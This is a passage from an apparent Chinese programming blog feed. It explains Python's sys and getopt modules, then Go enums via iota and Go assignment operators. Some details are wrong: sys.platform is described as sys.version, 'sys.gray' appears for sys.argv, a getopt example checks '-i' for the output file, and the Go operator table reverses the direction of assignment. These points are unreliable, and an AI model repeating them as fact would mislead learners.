打印下载速度"></a>3.5 打印下载速度</h4><p>Python 中的内置函数 print(text) 会自动的加入换行，而在某些场景下，不希望输出换行</p><p>程序在运行的过程中，断断续续的输出如下文本：</p><ul><li>Downloading 1%</li><li>Downloading 2%</li><li>…</li><li>Downloading 100%</li></ul><p>如果使用 print(text)，就会输出 100 行，无法达到上图的效果。</p><p>使用 sys.stdout.write(text) 可以控制程序输出在同一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">for</span> rate <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>): <span class="hljs-comment"># 使用for循环模拟下载的过程，总共输出100行文本</span><br>    text = <span class="hljs-string">&#x27;Downloading %d%%&#x27;</span> % rate<br>    sys.stdout.write(text)  <span class="hljs-comment"># 打印当前下载的速度</span><br>    sys.stdout.write(<span class="hljs-string">&#x27;\r&#x27;</span>)  <span class="hljs-comment"># 输出&#x27;\r&#x27;， 将光标移动到行首， 仅仅输出一个字符&#x27;\r&#x27;，不会在额外输出换行</span><br>    time.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="4-sys-path"><a href="#4-sys-path" class="headerlink" title="4. sys.path"></a>4. sys.path</h3><p>Python 的模块是一个普通的 Python 文件，例如 os 模块对应的文件是 os.py。os 模块是 Python 自带的模块，如果 Python 安装到 C:\Python3 目录下，在 C:\Python3\Lib 目录下能找到 os.py，即 os.py 的完整路径是 C:\Python3\Lib\os.py</p><p><strong>sys.path 是一个列表，列表保存了多个路径名</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(sys.path)<br></code></pre></td></tr></table></figure><p>Python 使用 ‘import os’ 引入 os 模块，注意：<strong>Python 使用模块名而不是模块的完整路径引入模块</strong>。</p><p>Python 查找模块 os 的过程如下：</p><ul><li>在 sys.path[0] 指向的目录 C:\Python3\DLLs 下查找文件 <a href="http://os.py/">os.py</a></li><li>在 sys.path[1] 指向的目录 C:\Python3\lib 下查找文件 <a href="http://os.py/">os.py</a></li><li>…</li></ul><h3 id="5-sys-version"><a href="#5-sys-version" class="headerlink" title="5. sys.version"></a>5. sys.version</h3><p>sys.version 记录了 Python 的版本</p><h3 id="6-sys-platform"><a href="#6-sys-platform" class="headerlink" title="6. sys.platform"></a>6. sys.platform</h3><p>sys.version 记录了操作系统的型号。</p><h2 id="getopt模块"><a href="#getopt模块" class="headerlink" title="getopt模块"></a>getopt模块</h2><h3 id="1-命令行参数"><a href="#1-命令行参数" class="headerlink" title="1. 命令行参数"></a>1. 命令行参数</h3><p>Python 提供了 <strong>getopt</strong> 模块来获取命令行参数。</p><p>getopt 语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">getopt.getopt(args, options[, long_options])<br></code></pre></td></tr></table></figure><p>getopt 是对 sys.argv获取的命令行参数进行二次处理。在运行程序的时候，可能需要根据不同的条件，输入不同的命令行选项来实现不同的功能，比如-u代表后面是用户，-p代表后面是密码。调用getopt.getopt()会返回两个列表，第一个列表复制给opts，第二个列表复制给args。</p><ul><li><p><strong>args</strong>: 要解析的命令行参数列表。</p></li><li><p><strong>options</strong>: 以字符串的格式定义，<strong>options</strong> 后的冒号 <strong>:</strong> 表示该选项必须有附加的参数，不带冒号表示该选项不附加参数。</p></li><li><p><strong>long_options</strong>: 以列表的格式定义，<strong>long_options</strong> 后的等号 <strong>&#x3D;</strong> 表示如果设置该选项，必须有附加的参数，否则就不附加参数。</p><p>该方法返回值由两个元素组成: 第一个是 <strong>(option, value)</strong> 元组的列表。 第二个是参数列表，包含那些没有 <strong>-</strong> 或 <strong>–</strong> 的参数。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> getopt<br><br>opts, args = getopt.getopt(sys.argv[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot;u:p:&quot;</span>, [<span class="hljs-string">&quot;file=&quot;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;opts输出结果为<span class="hljs-subst">&#123;opts&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;args输出结果为<span class="hljs-subst">&#123;args&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 demo.py -u user -p password  --file=demo.txt hello,python<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">opts输出结果为<span class="hljs-selector-attr">[(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>), (<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>), (<span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-string">&#x27;demo.txt&#x27;</span>)]</span><br>args输出结果为<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;hello,python&#x27;</span>]</span><br></code></pre></td></tr></table></figure><p>➡ 使用<strong>sys.gray[1:]</strong> 是为过滤第一个参数（第一个参数为python本身）</p><p>➡ “-u:-h” 为定义短格式选项 （ - ）。这里的h 和 u 为两个选项。 “h” 后面没有 “:” 表示h这个选项没有选项值， “u”后面有”:” 就必须有选项值</p><p>➡ [“help”, “file&#x3D;”] 为定义长格式选项 （–）。这里的 “&#x3D;” 和短格式选项中的 “:” 一样，后面必须跟选项值</p><h3 id="2-示例"><a href="#2-示例" class="headerlink" title="2. 示例"></a>2. 示例</h3><h4 id="2-1-短选项模式"><a href="#2-1-短选项模式" class="headerlink" title="2.1 短选项模式"></a>2.1 短选项模式</h4><p>定义一个 site() 函数，然后通过命令行输入站点名称 <strong>name</strong> 和网址 <strong>url</strong>，可以用缩写 <strong>n</strong> 和 <strong>u</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> getopt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">site</span>():<br>    name = <span class="hljs-literal">None</span><br>    url = <span class="hljs-literal">None</span><br><br>    argv = sys.argv[<span class="hljs-number">1</span>:]<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 短选项模式</span><br>        opts, args = getopt.getopt(argv, <span class="hljs-string">&quot;n:u:&quot;</span>)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;-n&#x27;</span>]:<br>            name = arg<br>        <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;-u&#x27;</span>]:<br>            url = arg<br><br>    <span class="hljs-built_in">print</span>( name + <span class="hljs-string">&quot; &quot;</span> + url)<br><br><br>site()<br></code></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 demo.py -n mochazz -u cyberzone.cloud<br></code></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mochazz</span> cyberzone.cloud<br></code></pre></td></tr></table></figure><h4 id="2-2-长选项模式"><a href="#2-2-长选项模式" class="headerlink" title="2.2 长选项模式"></a>2.2 长选项模式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> getopt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">site</span>():<br>    name = <span class="hljs-literal">None</span><br>    url = <span class="hljs-literal">None</span><br><br>    argv = sys.argv[<span class="hljs-number">1</span>:]<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 长选项模式</span><br>        opts, args = getopt.getopt(argv, <span class="hljs-string">&quot;n:u:&quot;</span>, [<span class="hljs-string">&quot;name=&quot;</span>, <span class="hljs-string">&quot;url=&quot;</span>])<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-string">&#x27;--name&#x27;</span>]:<br>            name = arg<br>        <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--url&#x27;</span>]:<br>            url = arg<br><br>    <span class="hljs-built_in">print</span>( name + <span class="hljs-string">&quot; &quot;</span> + url)<br><br><br>site()<br></code></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 demo.py --name mochazz --url cyberzone.cloud<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mochazz</span> cyberzone.cloud<br></code></pre></td></tr></table></figure><h3 id="3-Exception-getopt-GetoptError"><a href="#3-Exception-getopt-GetoptError" class="headerlink" title="3. Exception getopt.GetoptError"></a>3. Exception getopt.GetoptError</h3><p>在没有找到参数列表，或选项的需要的参数为空时会触发该异常。</p><p>异常的参数是一个字符串，表示错误的原因。属性 <strong>msg</strong> 和 <strong>opt</strong> 为相关选项的错误信息。</p><h4 id="3-1-示例"><a href="#3-1-示例" class="headerlink" title="3.1 示例"></a>3.1 示例</h4><p>假定创建这样一个脚本，可以通过命令行向脚本文件传递两个文件名，同时通过另外一个选项查看脚本的使用。脚本使用方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">demo.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;<br></code></pre></td></tr></table></figure><p>demo.py 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> getopt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    inputfile = <span class="hljs-string">&#x27;&#x27;</span><br>    outputfile = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        opts, args = getopt.getopt(argv, <span class="hljs-string">&#x27;hi:o:&#x27;</span>, [<span class="hljs-string">&#x27;ifile=&#x27;</span>, <span class="hljs-string">&#x27;ofile=&#x27;</span>])<br>    <span class="hljs-keyword">except</span> getopt.GetoptError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;demo.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;</span>)<br>        sys.exit(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-string">&#x27;-h&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;demo.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;</span>)<br>            sys.exit()<br>        <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ifile&#x27;</span>):<br>            inputfile = arg<br>        <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ofile&#x27;</span>):<br>            outputfile = arg<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;输出的文件为: <span class="hljs-subst">&#123;inputfile&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;输出的文件为: <span class="hljs-subst">&#123;outputfile&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv[<span class="hljs-number">1</span>:])<br><br></code></pre></td></tr></table></figure><p>测试代码</p><p><img src="/../img/Python%E5%B8%B8%E7%94%A8%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20230427223651698.png" alt="测试代码"></p><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="https://www.runoob.com/python3/python3-command-line-arguments.html">https://www.runoob.com/python3/python3-command-line-arguments.html</a></p><p><a href="http://www.imooc.com/wiki/pythonlesson2/sysmodule.html">http://www.imooc.com/wiki/pythonlesson2/sysmodule.html</a></p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习(二)</title>
    <link href="/2023/04/23/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
    <url>/2023/04/23/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h2 id="Go语言中代替枚举的办法"><a href="#Go语言中代替枚举的办法" class="headerlink" title="Go语言中代替枚举的办法"></a>Go语言中代替枚举的办法</h2><p><strong>枚举类型</strong>用于声明一组命名的常量，当一个变量有几种可能的取值时，可以将它定义为<strong>枚举类型</strong>。在 Go 语言中，并没有提供<strong>枚举类型</strong>，但是枚举类型又是开发过程中非常重要的数据类型。因为它可以事先定义一组<strong>有效的值</strong>，可以有效地防止用户提交无效数据，抽象到业务场景中就是我们平时网页上遇到的<strong>下拉框</strong>，或者我们选择快递地址时的<strong>省市信息</strong>，均为枚举类型的用武之地。所以在 Go 语言中对常量进行了一定的<strong>扩展</strong>，使其可以完美地替代枚举类型。</p><h3 id="1-常量中的iota"><a href="#1-常量中的iota" class="headerlink" title="1. 常量中的iota"></a>1. 常量中的iota</h3><p>为了使常量可以更好地替代枚举类型，Go 语言提供了一个<code>iota</code>关键字。使用<code>iota</code>初始化常量，可以生成一组规则类似的常量，但是不用每个常量都写一遍表达式。在一个<code>const()</code>表达式中，从<code>iota</code>开始的常量会被<strong>置为0</strong>，向后每个常量的值为<strong>前一个</strong>常量的值<strong>加一</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Weekday <span class="hljs-type">int</span> <span class="hljs-comment">//自定义一个星期类型，作为枚举类型</span><br><br><span class="hljs-keyword">const</span> (<br>Sun Weekday = <span class="hljs-literal">iota</span><br>Mon<br>Tues<br>Wed<br>Thur<br>Fri<br>Sat<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Sun :&quot;</span>, Sun)<br>fmt.Println(<span class="hljs-string">&quot;Mon :&quot;</span>, Mon)<br>fmt.Println(<span class="hljs-string">&quot;Tues:&quot;</span>, Tues)<br>fmt.Println(<span class="hljs-string">&quot;Wed :&quot;</span>, Wed)<br>fmt.Println(<span class="hljs-string">&quot;Thur:&quot;</span>, Thur)<br>fmt.Println(<span class="hljs-string">&quot;Fri :&quot;</span>, Fri)<br>fmt.Println(<span class="hljs-string">&quot;Sat :&quot;</span>, Sat)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Sun</span> : <span class="hljs-number">0</span><br><span class="hljs-attribute">Mon</span> : <span class="hljs-number">1</span><br><span class="hljs-attribute">Tues</span>: <span class="hljs-number">2</span><br><span class="hljs-attribute">Wed</span> : <span class="hljs-number">3</span><br><span class="hljs-attribute">Thur</span>: <span class="hljs-number">4</span><br><span class="hljs-attribute">Fri</span> : <span class="hljs-number">5</span><br><span class="hljs-attribute">Sat</span> : <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h3 id="2-将枚举值转换为字符串"><a href="#2-将枚举值转换为字符串" class="headerlink" title="2. 将枚举值转换为字符串"></a>2. 将枚举值转换为字符串</h3><p>使用<code>iota</code>是可以使用 Go 语言的常量代替枚举类型，但是由于输出值均为阿拉伯数字，给调试和辨识造成了一定的困难。为了解决这一问题，Go 语言还提供了使常量枚举值输出为字符串的办法。需要我们手动构造一个使用枚举类型输出字符串的方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Weekday <span class="hljs-type">int</span> <span class="hljs-comment">//自定义一个星期类型，作为枚举类型</span><br><br><span class="hljs-keyword">const</span> (<br>    Sun Weekday = <span class="hljs-literal">iota</span><br>    Mon<br>    Tues<br>    Wed<br>    Thur<br>    Fri<br>    Sat<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w Weekday)</span></span> String() <span class="hljs-type">string</span> &#123;<br>    <span class="hljs-keyword">switch</span> w &#123;<br>    <span class="hljs-keyword">case</span> Sun:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sun&quot;</span><br>    <span class="hljs-keyword">case</span> Mon:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Mon&quot;</span><br>    <span class="hljs-keyword">case</span> Tues:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Tues&quot;</span><br>    <span class="hljs-keyword">case</span> Wed:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wed&quot;</span><br>    <span class="hljs-keyword">case</span> Thur:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Thur&quot;</span><br>    <span class="hljs-keyword">case</span> Fri:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Fri&quot;</span><br>    <span class="hljs-keyword">case</span> Sat:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Sat&quot;</span><br>    &#125;<br>    <span class="hljs-comment">//不存在的枚举类型就返回&quot;N/A&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;N/A&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;Sun :&quot;</span>, Sun)<br>    fmt.Println(<span class="hljs-string">&quot;Mon :&quot;</span>, Mon)<br>    fmt.Println(<span class="hljs-string">&quot;Tues:&quot;</span>, Tues)<br>    fmt.Println(<span class="hljs-string">&quot;Wed :&quot;</span>, Wed)<br>    fmt.Println(<span class="hljs-string">&quot;Thur:&quot;</span>, Thur)<br>    fmt.Println(<span class="hljs-string">&quot;Fri :&quot;</span>, Fri)<br>    fmt.Println(<span class="hljs-string">&quot;Sat :&quot;</span>, Sat)<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Go语言中的运算符"><a href="#Go语言中的运算符" class="headerlink" title="Go语言中的运算符"></a>Go语言中的运算符</h2><h3 id="1-语言的赋值运算符"><a href="#1-语言的赋值运算符" class="headerlink" title="1. 语言的赋值运算符"></a>1. 语言的赋值运算符</h3><p>Go语言赋值运算符如下表所示：</p><table><thead><tr><th align="left">运算符</th><th align="left">结合性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将左边的实体赋值给右边的变量</td></tr><tr><td align="left">+&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>加运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">-&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>减运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">*&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>乘运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&#x2F;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>除运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">%&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>取余运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&gt;&gt;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>右位移运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&lt;&lt;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>左位移运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">&amp;&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>与运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">|&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>或运算之后</strong>赋值给右边的变量</td></tr><tr><td align="left">^&#x3D;</td><td align="left"><strong>从右到左</strong></td><td align="left">将右边的变量与左边的实体进行<strong>异或运算之后</strong>赋值给右边的变量</td></tr></tbody></table><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">28</span><br>    <span class="hljs-keyword">var</span> b = <span class="hljs-number">99</span><br>    a = b<br>    fmt.Println(<span class="hljs-string">&quot;  a = b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a += b<br>    fmt.Println(<span class="hljs-string">&quot; a += b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a -= b<br>    fmt.Println(<span class="hljs-string">&quot; a -= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a *= b<br>    fmt.Println(<span class="hljs-string">&quot; a *= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a /= <span class="hljs-number">2</span><br>    fmt.Println(<span class="hljs-string">&quot; a /= 2 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    b %= <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot; b %= 1 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a &amp;= b<br>    fmt.Println(<span class="hljs-string">&quot; a &amp;= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a |= b<br>    fmt.Println(<span class="hljs-string">&quot; a |= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a ^= b<br>    fmt.Println(<span class="hljs-string">&quot; a ^= b :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    a &gt;&gt;= <span class="hljs-number">2</span><br>    fmt.Println(<span class="hljs-string">&quot;a &gt;&gt;= 2 :&quot;</span>, a)<br>    a = <span class="hljs-number">28</span><br>    b &lt;&lt;= <span class="hljs-number">1</span><br>    fmt.Println(<span class="hljs-string">&quot;b &lt;&lt;= 1 :&quot;</span>, a)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-优先级"><a href="#2-优先级" 